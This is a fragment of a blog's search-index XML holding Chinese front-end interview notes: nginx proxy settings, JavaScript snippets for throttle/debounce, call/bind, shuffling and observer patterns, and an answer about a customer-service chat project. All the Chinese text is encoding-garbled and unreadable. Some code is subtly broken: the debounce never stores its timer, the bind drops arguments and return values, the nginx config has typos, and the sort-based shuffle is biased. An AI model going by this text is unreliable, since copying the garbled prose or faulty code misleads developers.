http://$http_host$request_url; # è¢«ä»£ç†è½¬å‘çš„åœ°å€ï¼Œ$http_host è¯·æ±‚çš„åŸŸåå’Œç«¯å£ï¼Œ$request_urlè¯·æ±‚URI &#125;&#125; Nginx è®¾ç½®åå‘ä»£ç† 123456789101112upstream myServers &#123; # upstream æœåŠ¡å™¨é›†åˆ server 192.168.30.20:3000 weigth=10; # weight è®¾ç½®æƒé‡ server 192.168.30.20:3001 weight=5; server 192.168.30.20:3002 weight=1;&#125; server &#123; listen 8080; server_name localhost; location /server &#123; proxy_pass http:myServer; &#125; &#125;]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•ä¹‹ä»£ç å®žçŽ°]]></title>
    <url>%2F2021%2F10%2F16%2Finter-code%2F</url>
    <content type="text"><![CDATA[æµ®ç‚¹æ•°æ•´æ•°ä½æ¯ä¸‰ä½æ·»åŠ ä¸€ä¸ªé€—å·12345function commafy(num) &#123; return num.toString().replace(/(\d)(?=(\d&#123;3&#125;)+\.)/g, function ($1) &#123; return $1 + ',' &#125;)&#125; å¦‚ä½•å®žçŽ°æ•°ç»„çš„éšæœºæŽ’åºï¼Ÿ æ–¹æ³•ä¸€ï¼šä¾æ¬¡å–å‡ºä¸€ä¸ªä½ç½®å’Œéšæœºä¸€ä¸ªä½ç½®äº¤æ¢ 1234567891011var arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]function randSort1(arr) &#123; for (var i = 0, len = arr.length; i &lt; len; i++) &#123; var rand = parseInt(Math.random() * len) var temp = arr[rand] arr[rand] = arr[i] arr[i] = temp &#125; return arr&#125;console.log(randSort1(arr)) æ–¹æ³•äºŒï¼šéšæœºå–å‡ºä¸€ä¸ªä½ç½®å€¼ï¼Œç„¶åŽåˆ é™¤è¿™ä¸ªå€¼ï¼ŒåŠ å…¥åˆ°æ–°æ•°ç»„ä¸­ï¼ŒçŸ¥é“å…ƒç´ ç»„ä¸ºç©º 1234567891011var arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]function randSort2(arr) &#123; var mixedArray = [] while (arr.length &gt; 0) &#123; var randomIndex = parseInt(Math.random() * arr.length) mixedArray.push(arr[randomIndex]) arr.splice(randomIndex, 1) &#125; return mixedArray&#125;console.log(randSort2(arr)) æ–¹æ³•ä¸‰ï¼šåˆ©ç”¨æŽ’åºå‡½æ•°sort() 12345var arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]arr.sort(function () &#123; return Math.random() - 0.5&#125;)console.log(arr) å®žçŽ° call()ã€applyã€bind()1234567891011121314151617181920212223// callFunction.prototype.call = function call(context, ...args) &#123; const self = this const key = Symbol('key') // null undefined context == null ? (context = window) : null // string number !/^(object|function)$/i.test(typeof context) ? (context = Object(context)) : null // array function object context[key] = self const result = context[key](...args) delete context[key] return result&#125;// bindFunction.prototype.bind = function bind(context, ...args) &#123; const self = this return function proxy() &#123; self.apply(context, args) &#125;&#125; å®žçŽ°èŠ‚æµï¼ˆthrottleï¼‰å’Œé˜²æŠ–ï¼ˆdebounceï¼‰å‡½æ•°èŠ‚æµ: é¢‘ç¹è§¦å‘ï¼Œä½†åªåœ¨ç‰¹å®šçš„æ—¶é—´å†…æ‰æ‰§è¡Œä¸€æ¬¡ä»£ç  12345678910111213function throttle(func, wait) &#123; let canRun = true return function (...args) &#123; if (!canRun) &#123; return &#125; canRun = false setTimeout(() =&gt; &#123; func.apply(this, args) canRun = true &#125;, wait) &#125;&#125; å‡½æ•°é˜²æŠ–: é¢‘ç¹è§¦å‘ï¼Œä½†åªåœ¨ç‰¹å®šçš„æ—¶é—´å†…æ²¡æœ‰è§¦å‘æ‰§è¡Œæ¡ä»¶æ‰æ‰§è¡Œä¸€æ¬¡ä»£ç  123456789function debounce(func, wait) &#123; let timer = null return function (...args) &#123; clearTimeout(timer) setTimeout(() =&gt; &#123; func.apply(this, args) &#125;, wait) &#125;&#125; å†™ä¸€ä¸ªé€šç”¨çš„äº‹ä»¶ç»‘å®šå¯¹è±¡123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384var EventUtil = &#123; // æ·»åŠ äº‹ä»¶ addHandler: function (element, type, handler) &#123; if (element.addEventListener) &#123; element.addEventListener(type, handler, false) &#125; else if (element.attachEvent) &#123; element.attachEvent('on' + type, handler) &#125; &#125;, // èŽ·å–äº‹ä»¶å¯¹è±¡ getEvent: function (ev) &#123; return ev || window.event &#125;, // èŽ·å–äº‹ä»¶ç›®æ ‡ getTarget: function (ev) &#123; return ev.target || ev.srcElement &#125;, // é˜»æ­¢é»˜è®¤äº‹ä»¶ preventDefault: function (ev) &#123; if (ev.preventDefault) &#123; ev.preventDefault() &#125; else &#123; ev.returnValue = false &#125; &#125;, // é˜»æ­¢å†’æ³¡ stopPropagation: function (ev) &#123; if (ev.stopPropagation) &#123; ev.stopPropagation() &#125; else &#123; ev.cancelBubble = true &#125; &#125;, // ç§»é™¤äº‹ä»¶ removeHandler: function (element, type, handler) &#123; if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false) &#125; else if (element.detachEvent) &#123; element.detachEvent('on' + type, handler) &#125; &#125;, // èŽ·å–ç›¸å…³å…ƒç´  getRelatedTarget: function (ev) &#123; if (ev.relatedTarget) &#123; return ev.relatedTarget &#125; else if (ev.toElement) &#123; return ev.toElement &#125; else if (ev.fromElement) &#123; return ev.fromElement &#125; &#125;, // èŽ·å–é¼ æ ‡æ»šåŠ¨ getWheelDelta: function (ev) &#123; // Firefox if (ev.DOMMouseScroll) &#123; return -ev.detail * 40 &#125; // å…¶ä»– else &#123; return ev.wheelDelta &#125; &#125;, // èŽ·å–keypressæŒ‰ä¸‹é”®å­—ç¬¦çš„ASCLLç  getCharCode: function (ev) &#123; if (typeof ev.charCode == 'number') &#123; return ev.charCode &#125; else &#123; return ev.keyCode &#125; &#125;, // èŽ·å–å‰ªè´´æ¿æ•°æ® getClipboardText: function (ev) &#123; var clipboardData = ev.clipboardData || window.clipboardData return clipboardData.getData('text') &#125;, // è®¾ç½®å‰ªè´´æ¿æ•°æ® setClipboardText: function (ev, value) &#123; if (ev.clipboardData) &#123; return ev.clipboardData.setData('text/plain', value) &#125; else if (window.clipboardData) &#123; return window.clipboardData.setData('text', value) &#125; &#125;&#125; å‚è€ƒ https://juejin.cn/post/7018337760687685669]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[inter-project]]></title>
    <url>%2F2021%2F09%2F07%2Finter-project%2F</url>
    <content type="text"><![CDATA[é¡ºä¸°åœ¨çº¿å®¢æœè®¿å®¢ç«¯é¡¹ç›® é¡ºä¸°åœ¨çº¿å®¢æœè®¿å®¢ç«¯æ˜¯ç”¨äºŽæ™ºèƒ½æœºå™¨äººä¸Žè®¿å®¢è‡ªåŠ©äº¤äº’æœåŠ¡ï¼Œè¿˜èƒ½ä¸Žå®¢æœäººå‘˜åœ¨çº¿æ²Ÿé€šã€‚é¡¹ç›®åŒ…æ‹¬ PC ç«¯å’Œ H5 ç«¯ï¼ŒæŽ¥å…¥é¡ºä¸°ä½“ç³»åº”ç”¨ 100 å¤šä¸ªæ¸ é“ï¼Œæ¯”å¦‚é€Ÿè¿ã€å†·è¿ã€ä¸°å·¢å’Œèˆªç©ºç­‰ä¸Žä¹‹ç›¸å…³å¾®ä¿¡ã€App å’Œå°ç¨‹åºæ¸ é“å®¢æœå…¥å£ã€‚ å‰ç«¯é¡¹ç›®ä½¿ç”¨ vueã€es6ã€vantã€elementã€better-scrollã€webpack ç­‰æŠ€æœ¯æ ˆæž„å»ºã€‚ åŸºäºŽ websocket å®žçŽ° IM é€šè®¯ï¼Œhttp è½®è¯¢åšå…œåº•ï¼Œå®žçŽ°æ¶ˆæ¯ç¡®è®¤æœºåˆ¶ï¼Œé˜²æ­¢æ¶ˆæ¯ä¸¢å¤±å’Œæ¶ˆæ¯åŽ»é‡ã€‚ å®žçŽ°äº†è¾“å…¥æ¡†å¸é™„ H5 è½¯é”®ç›˜å…¼å®¹æ–¹æ¡ˆã€‚ å®žçŽ°äº†å‰ç«¯ js å›¾ç‰‡åŽ‹ç¼©æ–¹æ¡ˆã€‚ ç­‰ç­‰ç›¸å…³éš¾é¢˜ã€‚ è¿½é—®ï¼šçŸ­è½®è¯¢å’Œé•¿è½®è¯¢åŒºåˆ«ï¼ŸçŸ­è½®è¯¢ï¼šæµè§ˆå™¨éš”æ®µæ—¶é—´å‘æœåŠ¡å™¨å‘é€ http è¯·æ±‚ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åŽï¼Œä¸è®ºæ•°æ®æ˜¯å¦æœ‰æ›´æ–°ï¼Œéƒ½ç›´æŽ¥å“åº”ã€‚ä¼˜ç‚¹æ˜¯å®žçŽ°ç®€å•ï¼Œç¼ºç‚¹æ˜¯å­˜åœ¨å¤§é‡æ— æ•ˆè¯·æ±‚ï¼Œæµªè´¹èµ„æºã€‚é•¿è½®è¯¢ï¼šæµè§ˆå™¨å‘é€è¯·æ±‚åŽï¼ŒæœåŠ¡å™¨ä¸ç«‹åˆ»è¿”å›žï¼ŒçŸ¥é“æœ‰æ•°æ®æ›´æ–°æˆ–è€…è¿žæŽ¥è¶…æ—¶æ‰è¿”å›žã€‚è¿”å›žåŽé‡æ–°å‘é€è¯·æ±‚ã€‚ä¼˜ç‚¹æ˜¯å…·æœ‰è¾ƒå¥½çš„æ—¶æ•ˆæ€§ï¼Œç¼ºç‚¹æ˜¯è¿žæŽ¥æŒ‚èµ·æ¶ˆè€—èµ„æºã€‚ è¿½é—®ï¼šæ¶ˆæ¯ç¡®è®¤æœºåˆ¶ä½ æ˜¯æ€Žæ ·åšçš„ï¼Ÿç”±äºŽæœåŠ¡å™¨æ˜¯åˆ†å¸ƒå¼çš„ï¼Œå„ç§æœºåž‹çš„ç»ˆç«¯å’Œç½‘ç»œçŽ¯å¢ƒï¼Œæ¶ˆæ¯ä»Žè®¿å®¢å‘é€ç»™å®¢æœï¼Œæˆ–è€…ä»Žå®¢æœå‘é€ç»™è®¿å®¢ä¸èƒ½ä¿è¯ 100%é€è¾¾æˆ–æ”¶åˆ°ã€‚è¿™ä¸ªæ—¶å€™å°±éœ€è¦ä¸€ä¸ªç±»ä¼¼ TCP å»ºç«‹è¿žæŽ¥çš„æ¶ˆæ¯ç¡®è®¤æœºåˆ¶ï¼Œæ¯”å¦‚è®¿å®¢å‘é€æ¶ˆæ¯ç»™å®¢æœï¼Œæ¶ˆæ¯å…ˆæŠµè¾¾æœåŠ¡å™¨å†åˆ°å®¢æœç«¯ï¼Œå®¢æœæœ‰æ²¡æœ‰æ”¶åˆ°å¯¹äºŽè®¿å®¢æ˜¯æœªçŸ¥çš„ï¼Œéœ€è¦åœ¨ä¸€æ®µæ—¶é—´å†…æ”¶åˆ°å®¢æœç«¯çš„åé¦ˆ ackï¼Œå°±ç¡®è®¤äº†æ”¶åˆ°äº†ï¼Œå¦åˆ™åœ¨è®¿å®¢ç«¯é‡å‘è¯¥æ¶ˆæ¯ã€‚åŒç†æ¶ˆæ¯ä»Žå®¢æœç«¯åˆ°è®¿å®¢ç«¯åŒæ ·éœ€è¦æ¶ˆæ¯åé¦ˆã€‚è¿™æ ·å°±æ˜¯æ¶ˆæ¯ç¡®è®¤æœºåˆ¶çš„åŽŸç†äº†ã€‚ å…·ä½“çš„å®žçŽ°æ˜¯åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œé˜Ÿåˆ—é‡Œé¢å­˜çš„æ˜¯æ¶ˆæ¯å®žä¾‹å¯¹è±¡ï¼Œå®žä¾‹æ–¹æ³•å®šä¹‰ä¸€ä¸ªå®šæ—¶å™¨ç”¨äºŽæ¶ˆæ¯ç¡®è®¤è®¡æ—¶ï¼ŒåŒæ—¶ä¸Šå±‚ç»´æŠ¤ä¸€ä¸ªè§‚å¯Ÿè€…å¯¹è±¡ï¼Œå½“æœ‰åœ¨ä¸€å®šæ—¶é—´å†…æ”¶åˆ°ç›¸åŒæ¶ˆæ¯ id çš„ ack æ¶ˆæ¯ï¼Œå°±ä¼šè§¦å‘è§‚å¯Ÿè€…æ›´æ–°æ¶ˆæ¯é˜Ÿåˆ—ä¸­å¯¹åº”çš„æ¶ˆæ¯çš„çŠ¶æ€ä¸ºæˆåŠŸï¼Œå¹¶ä¸”å…³é—­å®šæ—¶å™¨ï¼Œå¦åˆ™æ›´æ–°çŠ¶æ€ä¸ºå¤±è´¥ã€‚ è¿½é—®ï¼šè§‚å¯Ÿè€…æ¨¡å¼å’Œå‘å¸ƒè®¢é˜…æ¨¡å¼çš„åŒºåˆ«ï¼Ÿè§‚å¯Ÿè€…æ¨¡å¼ï¼Œåªæœ‰è§‚å¯Ÿè€…å’Œè¢«è§‚å¯Ÿè€…ä¸¤ä¸ªè§’è‰²ï¼Œè€Œå‘å¸ƒè®¢é˜…æ¨¡å¼ï¼Œé™¤äº†æœ‰å‘å¸ƒè€…å’Œè®¢é˜…è€…ï¼Œè¿˜æœ‰ä¸­é—´å±‚ï¼ˆbrokerï¼‰ã€‚ å‘å¸ƒè®¢é˜…æ¨¡å¼ï¼Œå‘å¸ƒè€…å’Œè®¢é˜…è€…æ˜¯è§£è€¦çš„ï¼Œè€Œè§‚å¯Ÿè€…æ¨¡å¼è§‚å¯Ÿè€…å’Œè¢«è§‚å¯Ÿè€…æ˜¯æ¾è§£è€¦ï¼› è§‚å¯Ÿè€…æ¨¡å¼å¤šç”¨äºŽå•ä¸ªåº”ç”¨å†…éƒ¨ï¼Œè€Œå‘å¸ƒè®¢é˜…æ¨¡å¼è·¨åº”ç”¨ï¼Œæ¯”å¦‚ä¸­é—´ä»¶ï¼› è¿½é—®ï¼šè§‚å¯Ÿè€…æ¨¡å¼å’Œå‘å¸ƒè®¢é˜…æ¨¡å¼å®žçŽ°ç»†èŠ‚ï¼Ÿè§‚å¯Ÿè€…æ¨¡å¼æŒ‡çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆSubjectï¼‰ç»´æŒä¸€ç³»åˆ—ä¾èµ–äºŽå®ƒçš„å¯¹è±¡ï¼ˆObserverï¼‰ï¼Œå½“æœ‰å…³çŠ¶æ€å‘ç”Ÿå˜æ›´æ—¶ï¼ŒSubject å¯¹è±¡é€šçŸ¥ä¸€ç³»åˆ— Observer å¯¹è±¡è¿›è¡Œæ›´æ–°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445// ç›®æ ‡å¯¹è±¡class Subject &#123; constructor() &#123; // ç»´æŠ¤è§‚å¯Ÿè€…åˆ—è¡¨ this.observers = [] &#125; // æ·»åŠ ä¸€ä¸ªè§‚å¯Ÿè€… add(observer) &#123; this.observers.push(observer) &#125; // åˆ é™¤ä¸€ä¸ªè§‚å¯Ÿè€… remove(observer) &#123; const &#123; observers &#125; = this for (let i = 0; i &lt; observers.length; i++) &#123; if (observers[i] === observer) &#123; observers.splice(i, 1) &#125; &#125; &#125; // é€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€… notify() &#123; const &#123; observers &#125; = this for (let i = 0; i &lt; observers.length; i++) &#123; observers[i].update() &#125; &#125;&#125;// è§‚å¯Ÿè€…class Observer &#123; constructor(name) &#123; this.name = name &#125; // æ›´æ–° update() &#123; console.log('name: ', this.name) &#125;&#125;const sub = new Subject()const obs1 = new Observer('wuwhs')const obs2 = new Observer('winfar')sub.add(obs1)sub.add(obs2)sub.notify() å‘å¸ƒè®¢é˜…æ¨¡å¼æŒ‡çš„æ˜¯å¸Œæœ›æŽ¥å—é€šçŸ¥çš„å¯¹è±¡ï¼ˆSubscriberï¼‰åŸºäºŽä¸€ä¸ªä¸»é¢˜é€šè¿‡è‡ªå®šä¹‰äº‹ä»¶è®¢é˜…ä¸»é¢˜ï¼Œå‘å¸ƒäº‹ä»¶çš„å¯¹è±¡ï¼ˆPublisherï¼‰é€šè¿‡å‘å¸ƒä¸»é¢˜äº‹ä»¶çš„æ–¹å¼é€šçŸ¥å„ä¸ªè®¢é˜…è¯¥ä¸»é¢˜çš„ Subscriber å¯¹è±¡ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243// å‘å¸ƒè®¢é˜…æ¨¡å¼çš„å®žçŽ°class PubSub &#123; constructor() &#123; // ç»´æŠ¤äº‹ä»¶åŠè®¢é˜…è¡Œä¸º this.events = &#123;&#125; &#125; // æ³¨å†Œäº‹ä»¶è®¢é˜…è¡Œä¸º subscribe(type, event) &#123; if (!this.events[type]) &#123; this.events[type] = [] &#125; this.events[type].push(event) &#125; // å‘å¸ƒäº‹ä»¶ publish(type, ...args) &#123; if (this.events[type]) &#123; this.events[type].forEach((event) =&gt; &#123; event(...args) &#125;) &#125; &#125; // ç§»é™¤æŸä¸ªäº‹ä»¶çš„è®¢é˜…è¡Œä¸º unsubscribe(type, event) &#123; const evts = this.events[type] if (evts) &#123; for (let i = 0; i &lt; evts.length; i++) &#123; if (evts[i] === event) &#123; evts.splice(i, 1) &#125; &#125; &#125; &#125;&#125;const pub = new PubSub()const fn = (...args) =&gt; &#123; console.log('subscribeï¼š', ...args)&#125;pub.subscribe('customer-event', fn)pub.publish('customer-event', 1, 2, 3) è¿½é—®ï¼šwebsocket åè®®ä½ äº†è§£å¤šå°‘ï¼Ÿå½“å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å»ºç«‹ websocket è¿žæŽ¥æ—¶ï¼Œåœ¨æ¡æ‰‹çš„è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯é¡¹æœåŠ¡ç«¯å‘é€ä¸€ä¸ª http è¯·æ±‚ï¼ŒåŒ…å« Upgrade è¯·æ±‚å¤´æ¥å‘ŠçŸ¥æœåŠ¡ç«¯å®¢æˆ·ç«¯éœ€è¦å»ºç«‹ä¸€ä¸ª websocket è¿žæŽ¥ï¼ŒåŒæ—¶è¯·æ±‚å¤´ Sec-Websocket-Key ä¼ ç»™æœåŠ¡ç«¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼ŒæœåŠ¡ç«¯æœ‰éƒ¨ç½² websocket æœåŠ¡ï¼Œåˆ™è¿”å›žçŠ¶æ€ç  101ï¼Œå¹¶å°† websocket-key åŠ ä¸Šä¸€ä¸²ç‰¹æ®Šå­—ç¬¦ï¼Œå†ç»è¿‡ hash åŠ å¯†ï¼Œè½¬åŒ–ä¸º base64ï¼Œé€šè¿‡å“åº”å¤´ Sec-Websocket-Accept è¿”å›žç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯é€šè¿‡åŒæ ·çš„ç®—æ³•æ¯”å¯¹ï¼Œå¦‚æžœç›¸åŒåˆ™æ¡æ‰‹æˆåŠŸã€‚ å‚è€ƒï¼šWebSocket åŽŸç†æµ…æžä¸Žå®žçŽ°ç®€å•èŠå¤©ä½ ä¸çŸ¥é“çš„ WebSocket js å›¾ç‰‡åŽ‹ç¼©ä½ æ˜¯æ€Žæ ·å®žçŽ°çš„ï¼Ÿå…¬å¸è¿ç»´ç›‘æŽ§å¹³å°åé¦ˆåœ¨çº¿å®¢æœä¸Šè¡Œå®½å¸¦ä½¿ç”¨æœ‰äº›åé«˜ï¼ŒåŽç«¯åŒå­¦æŸ¥åˆ°æ˜¯è®¿å®¢åœ¨èŠå¤©å‘é€å›¾ç‰‡ä¸Šä¼ æŽ¥å£å æ¯”è¾ƒå¤§ã€‚80%çš„è®¿å®¢æ²Ÿé€šéƒ½ä¼šå‘å›¾ç‰‡ç»™å®¢æœã€‚ç«™åœ¨å‰ç«¯çš„è§’åº¦ï¼Œå¯ä¸å¯ä»¥è¯•å›¾å°†å›¾ç‰‡åŽ‹ç¼©åŽå†é€šè¿‡æŽ¥å£ä¸Šä¼ å‘¢ï¼Ÿå¸¦ç€è¿™ä¸ªç–‘é—®æˆ‘æŸ¥é˜…äº†ç›¸å…³èµ„æ–™ï¼Œåˆšå¼€å§‹ç®€å•åœ°ç”¨äº†ä¸€æ¬¾å¼€æºçš„åº“ï¼Œåœ¨æœ¬åœ°æµ‹è¯•æ²¡æœ‰å¤ªå¤§çš„é—®é¢˜ï¼Œä¸Šåˆ°ç”Ÿäº§ï¼Œç»è¿‡å¤§é‡ç”¨æˆ·å’Œæœºåž‹çš„æ£€éªŒï¼Œæ‰å‘çŽ°æœ‰å¾ˆå¤šçš„å±€é™æ€§ï¼Œå¾ˆå¤šè¾¹ç•Œé—®é¢˜æ²¡æœ‰è¦†ç›–åˆ°ã€‚æ¯”å¦‚ png å›¾ç‰‡çš„åŽ‹ç¼©ä¸æ˜¯å¾ˆç†æƒ³ï¼Œä¼šå‡ºçŽ°â€œä¸å‡åå¢žâ€çŽ°è±¡ï¼Œé•¿æˆ–å®½å¤§äºŽ 1 ä¸‡ 6 åƒç´ çš„ png å›¾ç‰‡åœ¨æœ‰äº›æœºåž‹ä¸ŠåŽ‹ç¼©åŽå¯èƒ½æ˜¯é»‘çš„ã€‚ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘æ¢³ç†äº†å›¾ç‰‡åŽ‹ç¼©å¤§è‡´æµç¨‹ï¼šèŽ·å–åˆ°ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ Fileï¼Œå°† File è½¬åŒ–ï¼ˆFileReader.reandAsDataUrl æˆ– URL.createObjectURLï¼‰ä¸ºå›¾ç‰‡ Image å¯¹è±¡ï¼Œç„¶åŽè¯»å–åˆ° Canvasï¼ˆctx.drawImageï¼‰ï¼Œå†åˆ©ç”¨ Canvas åŽŸç”Ÿæ–¹æ³• canvas.toDataURL æˆ–è€… canvas.toBlob å®žçŽ°åŽ‹ç¼©è¾“å‡º base64 æˆ–è€… blobï¼Œæœ€åŽè½¬åŒ–ä¸º blob ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ å¤§è‡´æµç¨‹æ¸…æ¥šäº†ï¼ŒæŽ¥ä¸‹æ¥è§£å†³è¾¹ç•Œé—®é¢˜ã€‚ png å›¾ç‰‡åŽ‹ç¼©è¾“å‡ºç›¸åŒæ ¼å¼å›¾ç‰‡â€œä¸å‡åå¢žâ€çŽ°è±¡ã€‚ä½¿ç”¨ Canvas ä¸Šçš„æ–¹æ³•åŽ‹ç¼©ï¼Œæ˜¯ç”±æµè§ˆå™¨å†…æ ¸åº•å±‚ api ç®—æ³•å†³å®šçš„ï¼Œåœ¨åº”ç”¨å±‚é¢æš‚æ—¶æ— æ³•è§£å†³ï¼Œä½†æ˜¯ canvas.toDataURL å’Œ canvas.toBlob å¯ä»¥å°†å›¾ç‰‡è½¬æ¢ä¸º jpg æˆ–è€… webp æ ¼å¼ï¼ŒæŽ§åˆ¶å…¶è¾“å‡ºè´¨é‡ã€‚æ‰€ä»¥æˆ‘åšäº†ä¸€ä¸ªæŠ˜è¡·æ–¹æ¡ˆï¼Œå¯¹äºŽ png å›¾ç‰‡è®¾ç½®ä¸€ä¸ªé˜ˆå€¼ï¼Œå¦‚æžœå°äºŽè¿™ä¸ªé˜ˆå€¼åŽ‹ç¼©è¾“å‡º png æ ¼å¼ï¼Œè¾“å‡ºçš„ png å›¾ç‰‡è´¨é‡æ¯”æºå›¾ç‰‡å¤§ï¼Œåˆ™è‡ªå·±è¿”å›žæºå›¾ç‰‡ï¼›å¦‚æžœå¤§äºŽè¿™ä¸ªé˜ˆå€¼åˆ™åŽ‹ç¼©è¾“å‡º jpg æ ¼å¼ã€‚ é•¿å®½åƒç´ æ¯”è¾ƒå¤§çš„å›¾ç‰‡åŽ‹ç¼©å‡ºçŽ°é»‘å±çš„é—®é¢˜ã€‚æ ¹æ®å›¾ç‰‡å¤§å°åˆ›å»ºç›¸åŒå°ºå¯¸çš„ Canvasï¼ŒæŸ¥è¯¢äº†ä¸åŒæµè§ˆå™¨å†…æ ¸å¯¹ Canvas å¤§å°çš„é™åˆ¶å‘çŽ°ï¼Œæœ€å¤§å®½æˆ–è€…é«˜åœ¨ 2 ä¸‡åƒç´ å·¦å³ï¼Œå¯¹æ€»åƒç´ ä¹Ÿæœ‰é™åˆ¶ï¼Œå†å¤§å¯èƒ½å°±ä¼šå‡ºçŽ°æ„å¤–æƒ…å†µã€‚å› æ­¤é™å®šè¾“å‡ºå›¾ç‰‡å®½é«˜æ˜¯æœ‰å¿…è¦çš„ã€‚æˆ‘çš„æ–¹æ¡ˆæ˜¯å¯¹æºå›¾ç‰‡å®½é«˜å’Œè¾“å‡ºå›¾ç‰‡å®½é«˜åšç­‰æ¯”è½¬æ¢ï¼Œé˜²æ­¢æ‹‰ç¼©å›¾ç‰‡ï¼Œè¾“å‡ºå›¾ç‰‡å®½é«˜åšé™åˆ¶å…œåº•ã€‚ ç»¼åˆä¸Šè¿°çš„å¤„ç†æˆ‘å°è£…äº†ä¸€ä¸ª npm æ’ä»¶ js-image-compressorã€‚ å‚è€ƒäº†è§£ JS åŽ‹ç¼©å›¾ç‰‡ï¼Œè¿™ä¸€ç¯‡å°±å¤Ÿäº† èŠå¤©è¾“å…¥æ¡†å¸é™„ H5 è½¯ä»¶é”®ç›˜å…¼å®¹æ˜¯æ€Žä¹ˆåšçš„ï¼Ÿåœ¨é¡¹ç›®ä¹‹åˆï¼Œåœ¨ä¸åŒçš„æµ‹è¯•æœºçš„ä¸åŒæµè§ˆå™¨çŽ¯å¢ƒä¸­é¢„è§ˆäº¤äº’ H5 é¡µé¢æ•ˆæžœæ—¶ï¼Œå‘çŽ°è½¯é”®ç›˜å¼¹èµ·åŽï¼ŒèŠå¤©è¾“å…¥æ¡†è¢«è½¯é”®ç›˜ï¼ˆç‰¹åˆ«æ˜¯ç¬¬ä¸‰æ–¹è¾“å…¥æ³•çš„è½¯é”®ç›˜ï¼‰é®æŒ¡äº†ä¸€åŠæˆ–å®Œå…¨é®æŒ¡ï¼Œå¹¶ä¸æ˜¯åˆšå¥½å¸é™„åœ¨è½¯é”®ç›˜ä¸Šçš„æ•ˆæžœã€‚é”®ç›˜æ”¶èµ·åŽï¼Œåœ¨ IOS12+ä¸Šçš„å¾®ä¿¡ 6.7.4+æˆ–è€…å”¯å“ä¼š appã€æŠ–éŸ³ app ä¸Šï¼Œå‡ºçŽ°è§†å›¾â€œä¸‹ä¸æ¥â€ï¼Œè½¯é”®ç›˜å¼¹èµ·åŒºåŸŸç©ºç™½çŽ°è±¡ã€‚ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘é¦–å…ˆäº†è§£è¾“å…¥æ¡†ï¼ˆinputã€textarea æˆ–å¯Œæ–‡æœ¬ï¼‰åœ¨èŽ·å–ç„¦ç‚¹é”®ç›˜å¼¹èµ·ï¼Œå¤±åŽ»ç„¦ç‚¹é”®ç›˜æ”¶èµ·é¡µé¢å¾—è¡¨çŽ°ã€‚ åœ¨ IOS ä¸Šï¼Œè¾“å…¥æ¡†èŽ·å–ç„¦ç‚¹ï¼Œé”®ç›˜å¼¹èµ·ï¼Œé¡µé¢ï¼ˆwebviewï¼‰ä¸ä¼šè¢«åŽ‹ç¼©é«˜åº¦ï¼Œåªæ˜¯é¡µé¢æ•´ä½“å¾€ä¸Šæ»šäº†ï¼Œä¸”æ»šåŠ¨é«˜åº¦ä¸ºè½¯é”®ç›˜å¾—é«˜åº¦ï¼Œè¿™ä¸ªæ˜¯ IOS è‡ªå·±è®¡ç®—å¾—åˆ°çš„ã€‚ç‚¹å‡»è½¯é”®ç›˜ä¸Šçš„â€œæ”¶èµ·â€æŒ‰é’®æˆ–è€…è¾“å…¥æ¡†ä»¥å¤–å…¶ä»–åŒºåŸŸï¼Œè¾“å…¥æ¡†å¤±åŽ»ç„¦ç‚¹ï¼Œé”®ç›˜æ”¶èµ·ã€‚ åœ¨ Android ä¸Šï¼Œè¾“å…¥æ¡†èŽ·å–ç„¦ç‚¹ï¼Œé”®ç›˜å¼¹èµ·ï¼Œä½†æ˜¯é¡µé¢ï¼ˆwebviewï¼‰é«˜åº¦ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œé«˜åº¦ä¸ºå¯è§†åŒºé«˜åº¦ï¼Œä¹Ÿå°±æ˜¯åŽŸé«˜åº¦å‡åŽ»è½¯é”®ç›˜é«˜åº¦ï¼Œé¡µé¢æœ¬èº«ä¸å‘ç”Ÿæ»šåŠ¨ã€‚ç‚¹å‡»è½¯é”®ç›˜ä¸Šçš„â€œæ”¶èµ·â€æŒ‰é’®ï¼Œè¾“å…¥æ¡†ä¸ä¼šå¤±åŽ»ç„¦ç‚¹ï¼Œè½¯é”®ç›˜æ”¶èµ·ï¼ŒåŒæ ·è§¦å‘è¾“å…¥æ¡†ä»¥å¤–çš„åŒºåŸŸï¼Œè¾“å…¥æ¡†ä¼šå¤±åŽ»ç„¦ç‚¹ï¼Œè½¯é”®ç›˜æ”¶èµ·ã€‚ è¿™æ ·ï¼Œæˆ‘æ€»ç»“å‡ºäº†ï¼šåœ¨ IOS ä¸Šï¼Œç›‘å¬è¾“å…¥æ¡†çš„ focus äº‹ä»¶å°±å¯ä»¥èŽ·çŸ¥è½¯é”®ç›˜å¼¹èµ·äº†ï¼Œç›‘å¬è¾“å…¥æ¡†çš„ blur äº‹ä»¶èŽ·çŸ¥è½¯é”®ç›˜æ”¶èµ·äº†ï¼›åœ¨ Android 